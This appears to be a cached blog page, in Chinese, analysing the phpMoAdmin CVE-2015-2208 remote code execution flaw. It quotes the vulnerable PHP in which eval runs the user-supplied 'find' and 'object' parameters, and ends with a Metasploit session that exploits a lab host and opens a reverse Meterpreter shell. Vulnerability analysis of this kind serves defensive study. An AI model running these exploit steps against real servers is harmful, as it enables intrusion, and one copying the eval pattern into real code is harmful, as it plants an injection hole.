@@ -1,0 +1,127 @@
+I"�<h1 id="phpmoadmin-cve-2015-2208-远程代码执行漏洞分析">phpMoadmin CVE-2015-2208 远程代码执行漏洞分析</h1>
+<p class="date">05 Mar 2015 - Tr3jer_CongRong</p>
+
+<p>      <strong>phpMoAdmin 是一个用PHP 开发的在线MongoDB 管理工具，可用于创建、删除和修改数据库和索引，提供视图和数据搜索工具，提供数据库启动时间和内存的统计，支持JSON 格式数据的导入导出。</strong></p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/65ehrtdfgx.png" /></p>
+
+<blockquote>
+  <p>/phpmoadmin/moadmin.php 第555行</p>
+</blockquote>
+
+<pre><code>public function listRows($collection) {
+    foreach ($this-&gt;sort as $key =&gt; $val) { //cast vals to int
+        $sort[$key] = (int) $val;
+}
+$col = $this-&gt;mongo-&gt;selectCollection($collection);
+$find = array();
+if (isset($_GET['find']) &amp;&amp; $_GET['find']) {
+	$_GET['find'] = trim($_GET['find']);
+	if (strpos($_GET['find'], 'array') === 0) {
+		eval('$find = ' . $_GET['find'] . ';');
+	} else if (is_string($_GET['find'])) {
+		if ($findArr = json_decode($_GET['find'], true)) {
+			$find = $findArr;
+		}
+	}
+}
+</code></pre>
+
+<p>      <strong>在这个<code>listRows</code>方法中，eval执行GET接收的<code>find</code>参数，首先<code>$find</code>变量初始化为数组，而且通过strpos判断传入的值是否为数组。看看哪里调用了这个方法。</strong></p>
+
+<blockquote>
+  <p>/phpmoadmin/moadmin.php 第836行</p>
+</blockquote>
+
+<pre><code>if (isset($_GET['collection']) &amp;&amp; $action != 'listCollections' &amp;&amp; method_exists(self::$model, $action)) {
+    $this-&gt;mongo[$action] = self::$model-&gt;$action($_GET['collection']);
+    $this-&gt;mongo['count'] = self::$model-&gt;count;
+    $this-&gt;mongo['colKeys'] = self::$model-&gt;colKeys;
+}
+</code></pre>
+
+<p>      <strong>首先需要设置<code>collection</code>，根据<code>$action</code>跟踪到第785行，这里就可以通过<code>action</code>接收<code>listRows</code>参数来调用<code>listRows</code>方法。</strong></p>
+
+<pre><code>$action = (isset($_GET['action']) ? $_GET['action'] : 'listCollections');
+</code></pre>
+
+<p>      <strong>整体触发漏洞的逻辑就是首先通过<code>action</code>接收<code>listRows</code>，调用这个方法后，eval就会执行<code>$find</code>传入的值。由于过滤不严，即可执行传入的任意恶意代码。</strong></p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/r67jtydhrgdfs.png" /></p>
+
+<blockquote>
+  <p>/phpmoadmin/moadmin.php 第693行</p>
+</blockquote>
+
+<pre><code>public function saveObject($collection, $obj) {
+    eval('$obj=' . $obj . ';'); //cast from string to array
+    return $this-&gt;mongo-&gt;selectCollection($collection)-&gt;save($obj);
+}
+</code></pre>
+
+<p>      <strong><code>saveObject</code>函数中eval执行了形参$obj，找找哪里调用了这个函数。</strong></p>
+
+<blockquote>
+  <p>/phpmoadmin/moadmin.php 第786行</p>
+</blockquote>
+
+<pre><code>if (isset($_POST['object'])) {
+        if (self::$model-&gt;saveObject($_GET['collection'], $_POST['object'])) {
+            return $this-&gt;_dumpFormVals();
+        } else {
+            $action = 'editObject';
+            $_POST['errors']['object'] = 'Error: object could not be saved - check your array syntax.';
+        }
+}
+</code></pre>
+
+<p>      <strong>开头检查POST是否传输了<code>object</code>，随后内包含的if进行判断，这个过程即调用了当前类的<code>saveObject</code>方法，POST传入<code>object</code>参数的值带入eval后就造成了代码执行。</strong></p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/Screen%20Shot%202016-03-06%20at%2012.24.03%20AM.png" /></p>
+
+<blockquote>
+  <p>Msf也已经更新了此漏洞的Exploit:</p>
+</blockquote>
+
+<pre><code>msf &gt; use exploit/multi/http/phpmoadmin_exec
+msf exploit(phpmoadmin_exec) &gt; show options
+
+Module options (exploit/multi/http/phpmoadmin_exec):
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOST                       yes       The target address
+RPORT      80               yes       The target port
+SSL        false            no        Negotiate SSL/TLS for outgoing connections
+TARGETURI  /                yes       The URI path of the PHPMoAdmin page
+VHOST                       no        HTTP server virtual host
+
+Exploit target:
+
+Id  Name
+--  ----
+0   PHPMoAdmin
+
+msf exploit(phpmoadmin_exec) &gt; set RHOST 172.16.20.136
+RHOST =&gt; 172.16.20.136
+msf exploit(phpmoadmin_exec) &gt; set TARGETURI /phpmoadmin
+TARGETURI =&gt; /phpmoadmin
+msf exploit(phpmoadmin_exec) &gt; exploit
+
+[*] Started reverse TCP handler on 172.16.20.1:4444
+[*] Executing payload...
+[*] Sending stage (33684 bytes) to 172.16.20.136
+[*] Meterpreter session 1 opened (172.16.20.1:4444 -&gt; 172.16.20.136:33492) at 2015-03-05 22:34:56 +0800
+
+meterpreter &gt; ls
+Listing: /php/www/phpmoadmin
+=================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100644/rw-r--r--  31713   fil   2015-03-05 21:42:58 +0800  LICENSE
+100644/rw-r--r--  5078    fil   2015-03-05 21:42:58 +0800  README.textile
+100644/rw-r--r--  1858    fil   2015-03-05 21:42:58 +0800  change.log
+100644/rw-r--r--  111430  fil   2015-03-05 21:42:58 +0800  moadmin.php
+</code></pre>
+:ET
